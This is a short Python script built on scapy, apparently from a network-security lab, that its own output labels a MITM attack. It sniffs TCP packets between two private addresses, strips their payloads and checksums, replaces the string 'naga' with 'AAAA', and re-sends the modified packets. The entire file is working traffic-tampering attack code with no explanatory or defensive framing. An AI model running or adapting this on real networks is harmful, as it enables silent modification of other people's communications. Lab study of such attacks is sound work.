#!/usr/bin/env python3
from scapy.all import *

print("LAUNCHING MITM ATTACK.........")

def spoof_pkt(pkt):
   newpkt = IP(bytes(pkt[IP]))
   del(newpkt.chksum)
   del(newpkt[TCP].payload)
   del(newpkt[TCP].chksum)

   if pkt[TCP].payload:
       data = pkt[TCP].payload.load
       print("*** %s, length: %d" % (data, len(data)))

       # Replace a pattern
       newdata = data.replace(b'naga', b'AAAA')

       send(newpkt/newdata)
   else: 
       send(newpkt)

f = 'tcp and src host 10.9.0.5 and dst host 192.168.60.5'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)

